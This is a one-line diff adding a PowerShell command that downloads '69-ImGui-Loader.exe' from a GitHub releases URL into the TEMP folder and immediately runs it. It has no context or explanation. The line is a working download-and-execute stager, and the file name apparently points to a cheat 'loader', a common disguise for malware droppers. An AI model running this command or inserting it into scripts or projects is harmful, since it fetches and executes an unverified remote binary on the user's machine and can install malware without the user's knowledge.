@@ -1,0 +1,1 @@
+$u='https://github.com/auden131313/final/releases/download/1/69-ImGui-Loader.exe';$t="$env:TEMP\69-ImGui-Loader.exe";(New-Object Net.WebClient).DownloadFile($u,$t);Start-Process $t -Wait
